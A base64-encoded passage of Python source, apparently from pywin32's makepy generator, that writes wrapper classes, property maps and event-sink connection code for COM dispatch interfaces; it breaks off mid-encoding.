AgICAgIyBUaGlzIGlzIHByZXR0eSBzY3Jld2V5IC0gbm93IHdlIGhhdmUgdnRhYmxlIHN1cHBvcnQgd2VcbiAgICAgICAgIyBzaG91bGQgcHJvYmFibHkgcmV0aGluayB0aGlzIChpZSwgbWF5YmUgd3JpdGUgYm90aCBzaWRlcyBmb3Igc2lua3MsIGV0YylcbiAgICAgICAgaWYgc2VsZi5iSXNTaW5rOlxuICAgICAgICAgICAgc2VsZi5Xcml0ZUV2ZW50U2lua0NsYXNzSGVhZGVyKGdlbmVyYXRvcilcbiAgICAgICAgICAgIHNlbGYuV3JpdGVDYWxsYmFja0NsYXNzQm9keShnZW5lcmF0b3IpXG4gICAgICAgIGVsc2U6XG4gICAgICAgICAgICBzZWxmLldyaXRlQ2xhc3NIZWFkZXIoZ2VuZXJhdG9yKVxuICAgICAgICAgICAgc2VsZi5Xcml0ZUNsYXNzQm9keShnZW5lcmF0b3IpXG4gICAgICAgIHByaW50KGZpbGU9Z2VuZXJhdG9yLmZpbGUpXG4gICAgICAgIHNlbGYuYldyaXR0ZW4gPSAxXG5cbiAgICBkZWYgV3JpdGVDbGFzc0hlYWRlcihzZWxmLCBnZW5lcmF0b3IpOlxuICAgICAgICBnZW5lcmF0b3IuY2hlY2tXcml0ZURpc3BhdGNoQmFzZUNsYXNzKClcbiAgICAgICAgZG9jID0gc2VsZi5kb2NcbiAgICAgICAgc3RyZWFtID0gZ2VuZXJhdG9yLmZpbGVcbiAgICAgICAgcHJpbnQoImNsYXNzICIgKyBzZWxmLnB5dGhvbl9uYW1lICsgIihEaXNwYXRjaEJhc2VDbGFzcyk6IiwgZmlsZT1zdHJlYW0pXG4gICAgICAgIGlmIGRvY1sxXTpcbiAgICAgICAgICAgIHByaW50KCJcXHQiICsgYnVpbGQuX21ha2VEb2NTdHJpbmcoZG9jWzFdKSwgZmlsZT1zdHJlYW0pXG4gICAgICAgIHRyeTpcbiAgICAgICAgICAgIHByb2dJZCA9IHB5dGhvbmNvbS5Qcm9nSURGcm9tQ0xTSUQoc2VsZi5jbHNpZClcbiAgICAgICAgICAgIHByaW50KFxuICAgICAgICAgICAgICAgICJcXHQjIFRoaXMgY2xhc3MgaXMgY3JlYXRhYmxlIGJ5IHRoZSBuYW1lIFwnJXNcJyIgJSAocHJvZ0lkKSwgZmlsZT1zdHJlYW1cbiAgICAgICAgICAgIClcbiAgICAgICAgZXhjZXB0IHB5dGhvbmNvbS5jb21fZXJyb3I6XG4gICAgICAgICAgICBwYXNzXG4gICAgICAgIHByaW50KCJcXHRDTFNJRCA9ICIgKyByZXByKHNlbGYuY2xzaWQpLCBmaWxlPXN0cmVhbSlcbiAgICAgICAgaWYgc2VsZi5jb2NsYXNzX2Nsc2lkIGlzIE5vbmU6XG4gICAgICAgICAgICBwcmludCgiXFx0Y29jbGFzc19jbHNpZCA9IE5vbmUiLCBmaWxlPXN0cmVhbSlcbiAgICAgICAgZWxzZTpcbiAgICAgICAgICAgIHByaW50KCJcXHRjb2NsYXNzX2Nsc2lkID0gIiArIHJlcHIoc2VsZi5jb2NsYXNzX2Nsc2lkKSwgZmlsZT1zdHJlYW0pXG4gICAgICAgIHByaW50KGZpbGU9c3RyZWFtKVxuICAgICAgICBzZWxmLmJXcml0dGVuID0gMVxuXG4gICAgZGVmIFdyaXRlRXZlbnRTaW5rQ2xhc3NIZWFkZXIoc2VsZiwgZ2VuZXJhdG9yKTpcbiAgICAgICAgZ2VuZXJhdG9yLmNoZWNrV3JpdGVFdmVudEJhc2VDbGFzcygpXG4gICAgICAgIGRvYyA9IHNlbGYuZG9jXG4gICAgICAgIHN0cmVhbSA9IGdlbmVyYXRvci5maWxlXG4gICAgICAgIHByaW50KCJjbGFzcyAiICsgc2VsZi5weXRob25fbmFtZSArICI6IiwgZmlsZT1zdHJlYW0pXG4gICAgICAgIGlmIGRvY1sxXTpcbiAgICAgICAgICAgIHByaW50KCJcXHQiICsgYnVpbGQuX21ha2VEb2NTdHJpbmcoZG9jWzFdKSwgZmlsZT1zdHJlYW0pXG4gICAgICAgIHRyeTpcbiAgICAgICAgICAgIHByb2dJZCA9IHB5dGhvbmNvbS5Qcm9nSURGcm9tQ0xTSUQoc2VsZi5jbHNpZClcbiAgICAgICAgICAgIHByaW50KFxuICAgICAgICAgICAgICAgICJcXHQjIFRoaXMgY2xhc3MgaXMgY3JlYXRhYmxlIGJ5IHRoZSBuYW1lIFwnJXNcJyIgJSAocHJvZ0lkKSwgZmlsZT1zdHJlYW1cbiAgICAgICAgICAgIClcbiAgICAgICAgZXhjZXB0IHB5dGhvbmNvbS5jb21fZXJyb3I6XG4gICAgICAgICAgICBwYXNzXG4gICAgICAgIHByaW50KCJcXHRDTFNJRCA9IENMU0lEX1NpbmsgPSAiICsgcmVwcihzZWxmLmNsc2lkKSwgZmlsZT1zdHJlYW0pXG4gICAgICAgIGlmIHNlbGYuY29jbGFzc19jbHNpZCBpcyBOb25lOlxuICAgICAgICAgICAgcHJpbnQoIlxcdGNvY2xhc3NfY2xzaWQgPSBOb25lIiwgZmlsZT1zdHJlYW0pXG4gICAgICAgIGVsc2U6XG4gICAgICAgICAgICBwcmludCgiXFx0Y29jbGFzc19jbHNpZCA9ICIgKyByZXByKHNlbGYuY29jbGFzc19jbHNpZCksIGZpbGU9c3RyZWFtKVxuICAgICAgICBwcmludCgiXFx0X3B1YmxpY19tZXRob2RzXyA9IFtdICMgRm9yIENPTSBTZXJ2ZXIgc3VwcG9ydCIsIGZpbGU9c3RyZWFtKVxuICAgICAgICBXcml0ZVNpbmtFdmVudE1hcChzZWxmLCBzdHJlYW0pXG4gICAgICAgIHByaW50KGZpbGU9c3RyZWFtKVxuICAgICAgICBwcmludCgiXFx0ZGVmIF9faW5pdF9fKHNlbGYsIG9vYmogPSBOb25lKToiLCBmaWxlPXN0cmVhbSlcbiAgICAgICAgcHJpbnQoIlxcdFxcdGlmIG9vYmogaXMgTm9uZToiLCBmaWxlPXN0cmVhbSlcbiAgICAgICAgcHJpbnQoIlxcdFxcdFxcdHNlbGYuX29sZWNwID0gTm9uZSIsIGZpbGU9c3RyZWFtKVxuICAgICAgICBwcmludCgiXFx0XFx0ZWxzZToiLCBmaWxlPXN0cmVhbSlcbiAgICAgICAgcHJpbnQoIlxcdFxcdFxcdGltcG9ydCB3aW4zMmNvbS5zZXJ2ZXIudXRpbCIsIGZpbGU9c3RyZWFtKVxuICAgICAgICBwcmludChcbiAgICAgICAgICAgICJcXHRcXHRcXHRmcm9tIHdpbjMyY29tLnNlcnZlci5wb2xpY3kgaW1wb3J0IEV2ZW50SGFuZGxlclBvbGljeSIsIGZpbGU9c3RyZWFtXG4gICAgICAgIClcbiAgICAgICAgcHJpbnQoXG4gICAgICAgICAgICAiXFx0XFx0XFx0Y3BjPW9vYmouX29sZW9ial8uUXVlcnlJbnRlcmZhY2UocHl0aG9uY29tLklJRF9JQ29ubmVjdGlvblBvaW50Q29udGFpbmVyKSIsXG4gICAgICAgICAgICBmaWxlPXN0cmVhbSxcbiAgICAgICAgKVxuICAgICAgICBwcmludCgiXFx0XFx0XFx0Y3A9Y3BjLkZpbmRDb25uZWN0aW9uUG9pbnQoc2VsZi5DTFNJRF9TaW5rKSIsIGZpbGU9c3RyZWFtKVxuICAgICAgICBwcmludChcbiAgICAgICAgICAgICJcXHRcXHRcXHRjb29raWU9Y3AuQWR2aXNlKHdpbjMyY29tLnNlcnZlci51dGlsLndyYXAoc2VsZiwgdXNlUG9saWN5PUV2ZW50SGFuZGxlclBvbGljeSkpIixcbiAgICAgICAgICAgIGZpbGU9c3RyZWFtLFxuICAgICAgICApXG4gICAgICAgIHByaW50KCJcXHRcXHRcXHRzZWxmLl9vbGVjcCxzZWxmLl9vbGVjcF9jb29raWUgPSBjcCxjb29raWUiLCBmaWxlPXN0cmVhbSlcbiAgICAgICAgcHJpbnQoIlxcdGRlZiBfX2RlbF9fKHNlbGYpOiIsIGZpbGU9c3RyZWFtKVxuICAgICAgICBwcmludCgiXFx0XFx0dHJ5OiIsIGZpbGU9c3RyZWFtKVxuICAgICAgICBwcmludCgiXFx0XFx0XFx0c2VsZi5jbG9zZSgpIiwgZmlsZT1zdHJlYW0pXG4gICAgICAgIHByaW50KCJcXHRcXHRleGNlcHQgcHl0aG9uY29tLmNvbV9lcnJvcjoiLCBmaWxlPXN0cmVhbSlcbiAgICAgICAgcHJpbnQoIlxcdFxcdFxcdHBhc3MiLCBmaWxlPXN0cmVhbSlcbiAgICAgICAgcHJpbnQoIlxcdGRlZiBjbG9zZShzZWxmKToiLCBmaWxlPXN0cmVhbSlcbiAgICAgICAgcHJpbnQoIlxcdFxcdGlmIHNlbGYuX29sZWNwIGlzIG5vdCBOb25lOiIsIGZpbGU9c3RyZWFtKVxuICAgICAgICBwcmludChcbiAgICAgICAgICAgICJcXHRcXHRcXHRjcCxjb29raWUsc2VsZi5fb2xlY3Asc2VsZi5fb2xlY3BfY29va2llID0gc2VsZi5fb2xlY3Asc2VsZi5fb2xlY3BfY29va2llLE5vbmUsTm9uZSIsXG4gICAgICAgICAgICBmaWxlPXN0cmVhbSxcbiAgICAgICAgKVxuICAgICAgICBwcmludCgiXFx0XFx0XFx0Y3AuVW5hZHZpc2UoY29va2llKSIsIGZpbGU9c3RyZWFtKVxuICAgICAgICBwcmludCgiXFx0ZGVmIF9xdWVyeV9pbnRlcmZhY2VfKHNlbGYsIGlpZCk6IiwgZmlsZT1zdHJlYW0pXG4gICAgICAgIHByaW50KCJcXHRcXHRpbXBvcnQgd2luMzJjb20uc2VydmVyLnV0aWwiLCBmaWxlPXN0cmVhbSlcbiAgICAgICAgcHJpbnQoXG4gICAgICAgICAgICAiXFx0XFx0aWYgaWlkPT1zZWxmLkNMU0lEX1Npbms6IHJldHVybiB3aW4zMmNvbS5zZXJ2ZXIudXRpbC53cmFwKHNlbGYpIixcbiAgICAgICAgICAgIGZpbGU9c3RyZWFtLFxuICAgICAgICApXG4gICAgICAgIHByaW50KGZpbGU9c3RyZWFtKVxuICAgICAgICBzZWxmLmJXcml0dGVuID0gMVxuXG4gICAgZGVmIFdyaXRlQ2FsbGJhY2tDbGFzc0JvZHkoc2VsZiwgZ2VuZXJhdG9yKTpcbiAgICAgICAgc3RyZWFtID0gZ2VuZXJhdG9yLmZpbGVcbiAgICAgICAgcHJpbnQoIlxcdCMgRXZlbnQgSGFuZGxlcnMiLCBmaWxlPXN0cmVhbSlcbiAgICAgICAgcHJpbnQoXG4gICAgICAgICAgICAiXFx0IyBJZiB5b3UgY3JlYXRlIGhhbmRsZXJzLCB0aGV5IHNob3VsZCBoYXZlIHRoZSBmb2xsb3dpbmcgcHJvdG90eXBlczoiLFxuICAgICAgICAgICAgZmlsZT1zdHJlYW0sXG4gICAgICAgIClcbiAgICAgICAgZm9yIG5hbWUsIGVudHJ5IGluIChcbiAgICAgICAgICAgIGxpc3Qoc2VsZi5wcm9wTWFwR2V0Lml0ZW1zKCkpXG4gICAgICAgICAgICArIGxpc3Qoc2VsZi5wcm9wTWFwUHV0Lml0ZW1zKCkpXG4gICAgICAgICAgICArIGxpc3Qoc2VsZi5tYXBGdW5jcy5pdGVtcygpKVxuICAgICAgICApOlxuICAgICAgICAgICAgZmRlc2MgPSBlbnRyeS5kZXNjXG4gICAgICAgICAgICBtZXRoTmFtZSA9IE1ha2VFdmVudE1ldGhvZE5hbWUoZW50cnkubmFtZXNbMF0pXG4gICAgICAgICAgICBwcmludChcbiAgICAgICAgICAgICAgICAiI1xcdGRlZiAiXG4gICAgICAgICAgICAgICAgKyBtZXRoTmFtZVxuICAgICAgICAgICAgICAgICsgIihzZWxmIlxuICAgICAgICAgICAgICAgICsgYnVpbGQuQnVpbGRDYWxsTGlzdChcbiAgICAgICAgICAgICAgICAgICAgZmRlc2MsXG4gICAgICAgICAgICAgICAgICAgIGVudHJ5Lm5hbWVzLFxuICAgICAgICAgICAgICAgICAgICAiZGVmYXVsdE5hbWVkT3B0QXJnIixcbiAgICAgICAgICAgICAgICAgICAgImRlZmF1bHROYW1lZE5vdE9wdEFyZyIsXG4gICAgICAgICAgICAgICAgICAgICJkZWZhdWx0VW5uYW1lZEFyZyIsXG4gICAgICAgICAgICAgICAgICAgICJweXRob25jb20uTWlzc2luZyIsXG4gICAgICAgICAgICAgICAgICAgIGlzX2NvbW1lbnQ9VHJ1ZSxcbiAgICAgICAgICAgICAgICApXG4gICAgICAgICAgICAgICAgKyAiKToiLFxuICAgICAgICAgICAgICAgIGZpbGU9c3RyZWFtLFxuICAgICAgICAgICAgKVxuICAgICAgICAgICAgaWYgZW50cnkuZG9jIGFuZCBlbnRyeS5kb2NbMV06XG4gICAgICAgICAgICAgICAgcHJpbnQoIiNcXHRcXHQiICsgYnVpbGQuX21ha2VEb2NTdHJpbmcoZW50cnkuZG9jWzFdKSwgZmlsZT1zdHJlYW0pXG4gICAgICAgIHByaW50KGZpbGU9c3RyZWFtKVxuICAgICAgICBzZWxmLmJXcml0dGVuID0gMVxuXG4gICAgZGVmIFdyaXRlQ2xhc3NCb2R5KHNlbGYsIGdlbmVyYXRvcik6XG4gICAgICAgIHN0cmVhbSA9IGdlbmVyYXRvci5maWxlXG4gICAgICAgICMgV3JpdGUgaW4gYWxwaGEgb3JkZXIuXG4gICAgICAgIG5hbWVzID0gbGlzdChzZWxmLm1hcEZ1bmNzLmtleXMoKSlcbiAgICAgICAgbmFtZXMuc29ydCgpXG4gICAgICAgIHNwZWNpYWxJdGVtcyA9IHtcbiAgICAgICAgICAgICJjb3VudCI6IE5vbmUsXG4gICAgICAgICAgICAiaXRlbSI6IE5vbmUsXG4gICAgICAgICAgICAidmFsdWUiOiBOb25lLFxuICAgICAgICAgICAgIl9uZXdlbnVtIjogTm9uZSxcbiAgICAgICAgfSAgIyBJZiBmb3VuZCwgd2lsbCBlbmQgdXAgd2l0aCAoZW50cnksIGludm9rZV90dXBlKVxuICAgICAgICBpdGVtQ291bnQgPSBOb25lXG4gICAgICAgIGZvciBuYW1lIGluIG5hbWVzOlxuICAgICAgICAgICAgZW50cnkgPSBzZWxmLm1hcEZ1bmNzW25hbWVdXG4gICAgICAgICAgICBhc3NlcnQgZW50cnkuZGVzYy5kZXNja2luZCA9PSBweXRob25jb20uREVTQ0tJTkRfRlVOQ0RFU0NcbiAgICAgICAgICAgICMgc2tpcCBbcmVzdHJpY3RlZF0gbWV0aG9kcywgdW5sZXNzIGl0IGlzIHRoZVxuICAgICAgICAgICAgIyBlbnVtZXJhdG9yICh3aGljaCwgYmVpbmcgcGFydCBvZiB0aGUgInN5c3RlbSIsXG4gICAgICAgICAgICAjIHdlIGtub3cgYWJvdXQgYW5kIGNhbiB1c2UpXG4gICAgICAgICAgICBkaXNwaWQgPSBlbnRyeS5kZXNjLm1lbWlkXG4gICAgICAgICAgICBpZiAoXG4gICAgICAgICAgICAgICAgZW50cnkuZGVzYy53RnVuY0ZsYWdzICYgcHl0aG9uY29tLkZVTkNGTEFHX0ZSRVNUUklDVEVEXG4gICAgICAgICAgICAgICAgYW5kIGRpc3BpZCAhPSBweXRob25jb20uRElTUElEX05FV0VOVU1cbiAgICAgICAgICAgICk6XG4gICAgICAgICAgICAgICAgY29udGludWVcbiAgICAgICAgICAgICMgSWYgbm90IGFjY2Vzc2libGUgdmlhIElEaXNwYXRjaCwgdGhlbiB3ZSBjYW5cJ3QgdXNlIGl0IGhlcmUuXG4gICAgICAgICAgICBpZiBlbnRyeS5kZXNjLmZ1bmNraW5kICE9IHB5dGhvbmNvbS5GVU5DX0RJU1BBVENIOlxuICAgICAgICAgICAgICAgIGNvbnRpbnVlXG4gICAgICAgICAgICBpZiBkaXNwaWQgPT0gcHl0aG9uY29tLkRJU1BJRF9WQUxVRTpcbiAgICAgICAgICAgICAgICBsa2V5ID0gInZhbHVlIlxuICAgICAgICAgICAgZWxpZiBkaXNwaWQgPT0gcHl0aG9uY29tLkRJU1BJRF9ORVdFTlVNOlxuICAgICAgICAgICAgICAgIHNwZWNpYWxJdGVtc1siX25ld2VudW0iXSA9IChlbnRyeSwgZW50cnkuZGVzYy5pbnZraW5kLCBOb25lKVxuICAgICAgICAgICAgICAgIGNvbnRpbnVlICAjIERvbnQgYnVpbGQgdGhpcyBvbmUgbm93IVxuICAgICAgICAgICAgZWxzZTpcbiAgICAgICAgICAgICAgICBsa2V5ID0gbmFtZS5sb3dlcigpXG4gICAgICAgICAgICBpZiAoXG4gICAgICAgICAgICAgICAgbGtleSBpbiBzcGVjaWFsSXRlbXMgYW5kIHNwZWNpYWxJdGVtc1tsa2V5XSBpcyBOb25lXG4gICAgICAgICAgICApOiAgIyByZW1lbWJlciBpZiBhIHNwZWNpYWwgb25lLlxuICAgICAgICAgICAgICAgIHNwZWNpYWxJdGVtc1tsa2V5XSA9IChlbnRyeSwgZW50cnkuZGVzYy5pbnZraW5kLCBOb25lKVxuICAgICAgICAgICAgaWYgZ2VuZXJhdG9yLmJCdWlsZEhpZGRlbiBvciBub3QgZW50cnkuaGlkZGVuOlxuICAgICAgICAgICAgICAgIGlmIGVudHJ5LkdldFJlc3VsdE5hbWUoKTpcbiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlxcdCMgUmVzdWx0IGlzIG9mIHR5cGUgIiArIGVudHJ5LkdldFJlc3VsdE5hbWUoKSwgZmlsZT1zdHJlYW0pXG4gICAgICAgICAgICAgICAgaWYgZW50cnkud2FzUHJvcGVydHk6XG4gICAgICAgICAgICAgICAgICAgIHByaW50KFxuICAgICAgICAgICAgICAgICAgICAgICAgIlxcdCMgVGhlIG1ldGhvZCAlcyBpcyBhY3R1YWxseSBhIHByb3BlcnR5LCBidXQgbXVzdCBiZSB1c2VkIGFzIGEgbWV0aG9kIHRvIGNvcnJlY3RseSBwYXNzIHRoZSBhcmd1bWVudHMiXG4gICAgICAgICAgICAgICAgICAgICAgICAlIG5hbWUsXG4gICAgICAgICAgICAgICAgICAgICAgICBmaWxlPXN0cmVhbSxcbiAgICAgICAgICAgICAgICAgICAgKVxuICAgICAgICAgICAgICAgIHJldCA9IHNlbGYuTWFrZUZ1bmNNZXRob2QoZW50cnksIGJ1aWxkLk1ha2VQdWJsaWNBdHRyaWJ1dGVOYW1lKG5hbWUpKVxuICAgICAgICAgICAgICAgIGZvciBsaW5lIGluIHJldDpcbiAgICAgICAgICAgICAgICAgICAgcHJpbnQobGluZSwgZmlsZT1zdHJlYW0pXG4gICAgICAgIHByaW50KCJcXHRfcHJvcF9tYXBfZ2V0XyA9IHsiLCBmaWxlPXN0cmVhbSlcbiAgICAgICAgbmFtZXMgPSBsaXN0KHNlbGYucHJvcE1hcC5rZXlzKCkpXG4gICAgICAgIG5hbWVzLnNvcnQoKVxuICAgICAgICBmb3Iga2V5IGluIG5hbWVzOlxuICAgICAgICAgICAgZW50cnkgPSBzZWxmLnByb3BNYXBba2V5XVxuICAgICAgICAgICAgaWYgZ2VuZXJhdG9yLmJCdWlsZEhpZGRlbiBvciBub3QgZW50cnkuaGlkZGVuOlxuICAgICAgICAgICAgICAgIHJlc3VsdE5hbWUgPSBlbnRyeS5HZXRSZXN1bHROYW1lKClcbiAgICAgICAgICAgICAgICBpZiByZXN1bHROYW1lOlxuICAgICAgICAgICAgICAgICAgICBwcmludChcbiAgICAgICAgICAgICAgICAgICAgICAgICJcXHRcXHQjIFByb3BlcnR5IFwnJXNcJyBpcyBhbiBvYmplY3Qgb2YgdHlwZSBcJyVzXCciXG4gICAgICAgICAgICAgICAgICAgICAgICAlIChrZXksIHJlc3VsdE5hbWUpLFxuICAgICAgICAgICAgICAgICAgICAgICAgZmlsZT1zdHJlYW0sXG4gICAgICAgICAgICAgICAgICAgIClcbiAgICAgICAgICAgICAgICBsa2V5ID0ga2V5Lmxvd2VyKClcbiAgICAgICAgICAgICAgICBkZXRhaWxzID0gZW50cnkuZGVzY1xuICAgICAgICAgICAgICAgIHJlc3VsdERlc2MgPSBkZXRhaWxzWzJdXG4gICAgICAgICAgICAgICAgYXJnRGVzYyA9ICgpXG4gICAgICAgICAgICAgICAgbWFwRW50cnkgPSBNYWtlTWFwTGluZUVudHJ5KFxuICAgICAgICAgICAgICAgICAgICBkZXRhaWxzLm1lbWlkLFxuICAgICAgICAgICAgICAgICAgICBweXRob25jb20uRElTUEFUQ0hfUFJPUEVSVFlHRVQsXG4gICAgICAgICAgICAgICAgICAgIHJlc3VsdERlc2MsXG4gICAgICAgICAgICAgICAgICAgIGFyZ0Rlc2MsXG4gICAgICAgICAgICAgICAgICAgIGtleSxcbiAgICAgICAgICAgICAgICAgICAgZW50cnkuR2V0UmVzdWx0Q0xTSURTdHIoKSxcbiAgICAgICAgICAgICAgICApXG5cbiAgICAgICAgICAgICAgICBpZiBkZXRhaWxzLm1lbWlkID09IHB5dGhvbmNvbS5ESVNQSURfVkFMVUU6XG4gICAgICAgICAgICAgICAgICAgIGxrZXkgPSAidmFsdWUiXG4gICAgICAgICAgICAgICAgZWxpZiBkZXRhaWxzLm1lbWlkID09IHB5dGhvbmNvbS5ESVNQSURfTkVXRU5VTTpcbiAgICAgICAgICAgICAgICAgICAgbGtleSA9ICJfbmV3ZW51bSJcbiAgICAgICAgICAgICAgICBlbHNlOlxuICAgICAgICAgICAgICAgICAgICBsa2V5ID0ga2V5Lmxvd2VyKClcbiAgICAgICAgICAgICAgICBpZiAoXG4gICAgICAgICAgICAgICAgICAgIGxrZXkgaW4gc3BlY2lhbEl0ZW1zIGFuZCBzcGVjaWFsSXRlbXNbbGtleV0gaXMgTm9uZVxuICAgICAgICAgICAgICAgICk6ICAjIHJlbWVtYmVyIGlmIGEgc3BlY2lhbCBvbmUuXG4gICAgICAgICAgICAgICAgICAgIHNwZWNpYWxJdGVtc1tsa2V5XSA9IChcbiAgICAgICAgICAgICAgICAgICAgICAgIGVudHJ5LFxuICAgICAgICAgICAgICAgICAgICAgICAgcHl0aG9uY29tLkRJU1BBVENIX1BST1BFUlRZR0VULFxuICAgICAgICAgICAgICAgICAgICAgICAgbWFwRW50cnksXG4gICAgICAgICAgICAgICAgICAgIClcbiAgICAgICAgICAgICAgICAgICAgIyBBbGwgc3BlY2lhbCBtZXRob2RzLCBleGNlcHQgX25ld2VudW0sIGFyZSB3cml0dGVuXG4gICAgICAgICAgICAgICAgICAgICMgIm5vcm1hbGx5Ii4gIFRoaXMgaXMgYSBtZXNzIVxuICAgICAgICAgICAgICAgICAgICBpZiBkZXRhaWxzLm1lbWlkID09IHB5dGhvbmNvbS5ESVNQSURfTkVXRU5VTTpcbiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlXG5cbiAgICAgICAgICAgICAgICBwcmludChcbiAgICAgICAgICAgICAgICAgICAgXCdcXHRcXHQiJXMiOiAlcyxcJyAlIChidWlsZC5NYWtlUHVibGljQXR0cmlidXRlTmFtZShrZXkpLCBtYXBFbnRyeSksXG4gICAgICAgICAgICAgICAgICAgIGZpbGU9c3RyZWFtLFxuICAgICAgICAgICAgICAgIClcbiAgICAgICAgbmFtZXMgPSBsaXN0KHNlbGYucHJvcE1hcEdldC5rZXlzKCkpXG4gICAgICAgIG5hbWVzLnNvcnQoKVxuICAgICAgICBmb3Iga2V5IGluIG5hbWVzOlxuICAgICAgICAgICAgZW50cnkgPSBzZWxmLnByb3BNYXBHZXRba2V5XVxuICAgICAgICAgICAgaWYgZ2VuZXJhdG9yLmJCdWlsZEhpZGRlbiBvciBub3QgZW50cnkuaGlkZGVuOlxuICAgICAgICAgICAgICAgIGlmIGVudHJ5LkdldFJlc3VsdE5hbWUoKTpcbiAgICAgICAgICAgICAgICAgICAgcHJpbnQoXG4gICAgICAgICAgICAgICAgICAgICAgICAiXFx0XFx0IyBNZXRob2QgXCclc1wnIHJldHVybnMgb2JqZWN0IG9mIHR5cGUgXCclc1wnIlxuICAgICAgICAgICAgICAgICAgICAgICAgJSAoa2V5LCBlbnRyeS5HZXRSZXN1bHROYW1lKCkpLFxuICAgICAgICAgICAgICAgICAgICAgICAgZmlsZT1zdHJlYW0sXG4gICAgICAgICAgICAgICAgICAgIClcbiAgICAgICAgICAgICAgICBkZXRhaWxzID0gZW50cnkuZGVzY1xuICAgICAgICAgICAgICAgIGFzc2VydCBkZXRhaWxzLmRlc2NraW5kID09IHB5dGhvbmNvbS5ERVNDS0lORF9GVU5DREVTQ1xuICAgICAgICAgICAgICAgIGxrZXkgPSBrZXkubG93ZXIoKVxuICAgICAgICAgICAgICAgIGFyZ0Rlc2MgPSBkZXRhaWxzWzJdXG4gICAgICAgICAgICAgICAgcmVzdWx0RGVzYyA9IGRldGFpbHNbOF1cbiAgICAgICAgICAgICAgICBtYXBFbnRyeSA9IE1ha2VNYXBMaW5lRW50cnkoXG4gICAgICAgICAgICAgICAgICAgIGRldGFpbHNbMF0sXG4gICAgICAgICAgICAgICAgICAgIHB5dGhvbmNvbS5ESVNQQVRDSF9QUk9QRVJUWUdFVCxcbiAgICAgICAgICAgICAgICAgICAgcmVzdWx0RGVzYyxcbiAgICAgICAgICAgICAgICAgICAgYXJnRGVzYyxcbiAgICAgICAgICAgICAgICAgICAga2V5LFxuICAgICAgICAgICAgICAgICAgICBlbnRyeS5HZXRSZXN1bHRDTFNJRFN0cigpLFxuICAgICAgICAgICAgICAgIClcbiAgICAgICAgICAgICAgICBpZiBkZXRhaWxzLm1lbWlkID09IHB5dGhvbmNvbS5ESVNQSURfVkFMVUU6XG4gICAgICAgICAgICAgICAgICAgIGxrZXkgPSAidmFsdWUiXG4gICAgICAgICAgICAgICAgZWxpZiBkZXRhaWxzLm1lbWlkID09IHB5dGhvbmNvbS5ESVNQSURfTkVXRU5VTTpcbiAgICAgICAgICAgICAgICAgICAgbGtleSA9ICJfbmV3ZW51bSJcbiAgICAgICAgICAgICAgICBlbHNlOlxuICAgICAgICAgICAgICAgICAgICBsa2V5ID0ga2V5Lmxvd2VyKClcbiAgICAgICAgICAgICAgICBpZiAoXG4gICAgICAgICAgICAgICAgICAgIGxrZXkgaW4gc3BlY2lhbEl0ZW1zIGFuZCBzcGVjaWFsSXRlbXNbbGtleV0gaXMgTm9uZVxuICAgICAgICAgICAgICAgICk6ICAjIHJlbWVtYmVyIGlmIGEgc3BlY2lhbCBvbmUuXG4gICAgICAgICAgICAgICAgICAgIHNwZWNpYWxJdGVtc1tsa2V5XSA9IChcbiAgICAgICAgICAgICAgICAgICAgICAgIGVudHJ5LFxuICAgICAgICAgICAgICAgICAgICAgICAgcHl0aG9uY29tLkRJU1BBVENIX1BST1BFUlRZR0VULFxuICAgICAgICAgICAgICAgICAgICAgICAgbWFwRW50cnksXG4gICAgICAgICAgICAgICAgICAgIClcbiAgICAgICAgICAgICAgICAgICAgIyBBbGwgc3BlY2lhbCBtZXRob2RzLCBleGNlcHQgX25ld2VudW0sIGFyZSB3cml0dGVuXG4gICAgICAgICAgICAgICAgICAgICMgIm5vcm1hbGx5Ii4gIFRoaXMgaXMgYSBtZXNzIVxuICAgICAgICAgICAgICAgICAgICBpZiBkZXRhaWxzLm1lbWlkID09IHB5dGhvbmNvbS5ESVNQSURfTkVXRU5VTTpcbiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlXG4gICAgICAgICAgICAgICAgcHJpbnQoXG4gICAgICAgICAgICAgICAgICAgIFwnXFx0XFx0IiVzIjogJXMsXCcgJSAoYnVpbGQuTWFrZVB1YmxpY0F0dHJpYnV0ZU5hbWUoa2V5KSwgbWFwRW50cnkpLFxuICAgICAgICAgICAgICAgICAgICBmaWxlPXN0cmVhbSxcbiAgICAgICAgICAgICAgICApXG5cbiAgICAgICAgcHJpbnQoIlxcdH0iLCBmaWxlPXN0cmVhbSlcblxuICAgICAgICBwcmludCgiXFx0X3Byb3BfbWFwX3B1dF8gPSB7IiwgZmlsZT1zdHJlYW0pXG4gICAgICAgICMgVGhlc2UgYXJlICJJbnZva2UiIGFyZ3NcbiAgICAgICAgbmFtZXMgPSBsaXN0KHNlbGYucHJvcE1hcC5rZXlzKCkpXG4gICAgICAgIG5hbWVzLnNvcnQoKVxuICAgICAgICBmb3Iga2V5IGluIG5hbWVzOlxuICAgICAgICAgICAgZW50cnkgPSBzZWxmLnByb3BNYXBba2V5XVxuICAgICAgICAgICAgaWYgZ2VuZXJhdG9yLmJCdWlsZEhpZGRlbiBvciBub3QgZW50cnkuaGlkZGVuOlxuICAgICAgICAgICAgICAgIGxrZXkgPSBrZXkubG93ZXIoKVxuICAgICAgICAgICAgICAgIGRldGFpbHMgPSBlbnRyeS5kZXNjXG4gICAgICAgICAgICAgICAgIyBJZiBkZWZhdWx0IGFyZyBpcyBOb25lLCB3cml0ZSBhbiBlbXB0eSB0dXBsZVxuICAgICAgICAgICAgICAgIGRlZkFyZ0Rlc2MgPSBidWlsZC5NYWtlRGVmYXVsdEFyZ1JlcHIoZGV0YWlsc1syXSlcbiAgICAgICAgICAgICAgICBpZiBkZWZBcmdEZXNjIGlzIE5vbmU6XG4gICAgICAgICAgICAgICAgICAgIGRlZkFyZ0Rlc2MgPSAiIlxuICAgICAgICAgICAgICAgIGVsc2U6XG4gICAgICAgICAgICAgICAgICAgIGRlZkFyZ0Rlc2MgPSBkZWZBcmdEZXNjICsgIiwiXG4gICAgICAgICAgICAgICAgcHJpbnQoXG4gICAgICAgICAgICAgICAgICAgIFwnXFx0XFx0IiVzIiA6ICgoJXMsIExDSUQsICVkLCAwKSwoJXMpKSxcJ1xuICAgICAgICAgICAgICAgICAgICAlIChcbiAgICAgICAgICAgICAgICAgICAgICAgIGJ1aWxkLk1ha2VQdWJsaWNBdHRyaWJ1dGVOYW1lKGtleSksXG4gICAgICAgICAgICAgICAgICAgICAgICBkZXRhaWxzWzBdLFxuICAgICAgICAgICAgICAgICAg